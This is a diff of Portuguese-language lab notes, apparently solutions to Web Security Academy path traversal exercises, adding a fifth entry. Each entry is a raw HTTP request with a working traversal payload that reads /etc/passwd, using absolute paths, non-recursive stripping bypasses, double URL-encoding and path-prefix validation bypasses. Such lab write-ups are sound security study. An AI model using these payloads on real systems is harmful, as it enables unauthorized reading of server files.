@@ -19,7 +19,7 @@ Connection: close
 ### >> 2. File path traversal, traversal sequences blocked with absolute path bypass
 Crie uma requisição GET contendo o caminho do arquivo a ser lido
 
-````
+````http
 GET /image?filename=/etc/passwd HTTP/1.1
 Host: ac601f011f09bc6dc05120b5004a00fa.web-security-academy.net
 Accept-Encoding: gzip, deflate
@@ -34,7 +34,7 @@ Connection: close
 ### >> 3. File path traversal, traversal sequences stripped non-recursively
 Crie uma requisição GET contendo o caminho do arquivo a ser lido
 
-````
+````http
 GET /image?filename=....//....//....//....//etc//passwd HTTP/1.1
 Host: acb91f041e530947c0f6088a004200cf.web-security-academy.net
 Accept-Encoding: gzip, deflate
@@ -49,7 +49,7 @@ Connection: close
 ### >> 4. File path traversal, traversal sequences stripped with superfluous URL-decode
 Crie uma requisição GET contendo o caminho do arquivo a ser lido
 
-````
+````http
 GET /image?filename=....%2f%2f....%2f%2f....%2f%2fetc%2f%2fpasswd HTTP/1.1
 Host: acb61f3c1e42de95c004183200790000.web-security-academy.net
 Accept-Encoding: gzip, deflate
@@ -59,8 +59,23 @@ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
 Connection: close
 
 
+````
+
+### >> 5. File path traversal, validation of start of path
+Crie uma requisição GET contendo o caminho do arquivo a ser lido
+
+````http
+GET /image?filename=/var/www/images/../../../etc/passwd HTTP/1.1
+Host: ac161f371e40f5e0c054e80a00050088.web-security-academy.net
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
+Connection: close
+
 
 ````
+
 
 
 ## File upload vulnerabilities 
